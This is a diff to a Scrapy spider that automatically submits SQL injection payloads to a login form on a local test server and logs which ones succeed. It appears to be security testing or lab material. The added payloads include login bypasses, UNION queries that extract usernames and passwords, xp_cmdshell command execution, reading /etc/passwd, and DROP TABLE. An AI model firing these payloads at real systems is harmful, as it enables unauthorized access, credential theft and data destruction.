@@ -7,24 +7,47 @@ class SqliTestSpider(scrapy.Spider):
     ]
 
     def parse(self, response):
-        # List of SQL injection payloads to test
+        # Log that we reached the page
+        self.logger.info(f"Reached start URL: {response.url}")
+
         payloads = [
-            "' OR '1'='1",
+            "' OR '1'='1' --",
             "' OR 1=1 --",
-            "'; DROP TABLE users;--"
+            "' OR '1'='1' /*",
+            "' OR '' = '",
+            "'; EXEC xp_cmdshell('dir') --",
+            "' UNION SELECT NULL, NULL, NULL --",
+            "' UNION SELECT username, password FROM users --",
+            "' AND 1=CONVERT(int, (SELECT @@version)) --",
+            "' OR SLEEP(5) --",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT LOAD_FILE('/etc/passwd') --",
+            "admin' --",
+            "admin' #",
+            "admin'/*",
+            "') OR ('1'='1",
+            "') OR 1=1 --",
+            "random' OR 'x'='x",
+            "' OR EXISTS(SELECT * FROM users) --"
         ]
-        
-        # Loop through each payload and submit the form with it
+
+
         for payload in payloads:
+            self.logger.info(f"Submitting payload: {payload}")
             yield scrapy.FormRequest(
-                url='http://localhost:5001/sqli',  # The URL to handle the login submission
+                url='http://localhost:5001/sqli',
                 formdata={'username': payload, 'password': payload},
-                callback=self.after_submission
+                callback=self.after_submission,
+                meta={'payload': payload}
             )
 
     def after_submission(self, response):
-        # Check if the form was successfully submitted and log the result
+        payload = response.meta['payload']
+        
         if "Welcome" in response.text:
-            self.log(f"Successful SQLi with payload: {response.url}")
+            self.logger.info(f"✅ Successful SQL Injection with payload: {payload}")
         else:
-            self.log(f"SQLi failed with payload: {response.url}")
+            self.logger.info(f"❌ SQL Injection failed with payload: {payload}")
+
+        # Also log HTTP response status
+        self.logger.info(f"HTTP Response Code: {response.status}")
